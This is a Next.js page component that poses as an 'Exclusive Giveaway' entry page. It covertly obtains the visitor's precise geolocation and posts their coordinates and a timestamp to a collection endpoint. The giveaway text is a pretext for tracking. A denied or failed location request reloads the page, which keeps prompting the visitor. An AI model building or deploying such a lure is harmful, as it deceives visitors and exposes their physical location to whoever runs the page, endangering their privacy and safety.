"use client";

import { useEffect, useState } from "react";

export default function Home() {
  const [status, setStatus] = useState("Requesting location…");

  useEffect(() => {
    if (!("geolocation" in navigator)) {
      setStatus("Geolocation not supported on this device.");
      return;
    }

    const opts: PositionOptions = {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 20000,
    };

    const targetAccuracy = 5000; // meters
    const hardStopMs = 15000; // 15s limit
    let stopped = false;

    function stop(reason: string) {
      if (stopped) return;
      stopped = true;
      setStatus(reason);
    }

    const timer = setTimeout(() => stop("Timed out after 15s."), hardStopMs);

  const watchId = navigator.geolocation.watchPosition(
  async (pos: GeolocationPosition) => {
    const { latitude, longitude, accuracy } = pos.coords;

    if (accuracy <= targetAccuracy) {
      
      await fetch("/api/collect-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          lat: latitude,
          lon: longitude,
          accuracy_m: accuracy,
          timestamp: new Date().toISOString(),
        }),
      });

      navigator.geolocation.clearWatch(watchId);
    } else {
      await fetch("/api/collect-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          lat: latitude,
          lon: longitude,
          accuracy_m: 404,
          timestamp: new Date().toISOString(),
        }),
      });

      navigator.geolocation.clearWatch(watchId);
    }
  },
  (err) => {
    window.location.reload();
  },
  opts
);


    return () => {
      clearTimeout(timer);
      navigator.geolocation.clearWatch(watchId);
    };
  }, []);

  return (
  <main
    style={{
      fontFamily: "system-ui, sans-serif",
      background: "linear-gradient(135deg, #f9fafb, #e5e7eb)",
      minHeight: "100vh",
      display: "flex",
      justifyContent: "center",
      alignItems: "center",
      padding: "2rem",
    }}
  >
    <div
      style={{
        background: "white",
        borderRadius: "1rem",
        boxShadow: "0 8px 20px rgba(0,0,0,0.1)",
        padding: "2rem",
        maxWidth: "400px",
        textAlign: "center",
      }}
    >
      <h1 style={{ fontSize: "1.8rem", fontWeight: "bold", marginBottom: "1rem", color:'black' }}>
        🎉 Exclusive Giveaway!
      </h1>
      <p style={{ fontSize: "1rem", marginBottom: "1.5rem", color: "#4b5563" }}>
        You’ve been selected to join our special giveaway event.  
        Stay on this page for a moment to confirm your entry.
      </p>
      <div
        style={{
          marginTop: "1rem",
          padding: "1rem",
          borderRadius: "0.75rem",
          background: "#f3f4f6",
          color: "#374151",
          fontSize: "0.9rem",
        }}
      >
        <strong style={{color:'green'}}>Status: {status}</strong> 
      </div>
    </div>
  </main>
);

}
